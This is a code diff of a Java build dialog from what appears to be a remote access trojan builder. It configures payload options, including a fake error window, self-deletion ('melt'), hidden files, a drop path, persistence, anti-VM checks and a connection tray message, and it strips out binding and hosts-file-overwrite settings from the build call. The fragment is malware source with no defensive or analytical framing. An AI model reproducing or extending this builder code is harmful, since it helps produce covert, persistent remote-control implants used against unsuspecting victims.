@@ -255,36 +255,27 @@ public class FrameBuildMinimal extends BaseFrame {
 				int fakeicon = -1;
 				boolean melt = false;
 				boolean runNextBoot = false;
-				boolean bind = false;
 				boolean hiddenFile = false;
-				String bindpath = null;
-				String bindname = null;
-				int droptarget = -1;
 				boolean usemutex = false;
 				int mutexport = -1;
 				boolean timeout = false;
 				int timeoutms = -1;
 				boolean delay = false;
 				int delayms = -1;
-				boolean usehost = false;
-				String hosttext = null;
-				boolean overwritehost = false;
 				boolean trayicon = true;
 				String icon = null;
 				String traymsg = "Connected to control controller";
 				String traymsgfail = "Disconnected from controller";
 				String traytitle = Constants.NAME;
-				boolean handleerr = true;
 				boolean persistance = false;
 				int persistancems = -1;
-				boolean debugmsg = true;
 				OSConfig osconfig = new OSConfig();
 				osconfig.addOS(OperatingSystem.WINDOWS);
 				osconfig.addOS(OperatingSystem.MACOS);
 				osconfig.addOS(OperatingSystem.LINUX);
 				boolean antivm = false;
 
-				Build.build(l, Globals.getStub(), file, addresses, id, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);
+				Build.build(l, Globals.getStub(), file, addresses, id, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, usemutex, mutexport, timeout, timeoutms, delay, delayms, trayicon, icon, traymsg, traymsgfail, traytitle, persistance, persistancems, true, antivm);
 
 				Settings.getGlobal().set(Settings.KEY_BUILD_ID, id);
 				Settings.getGlobal().setBuildPassword(pass);
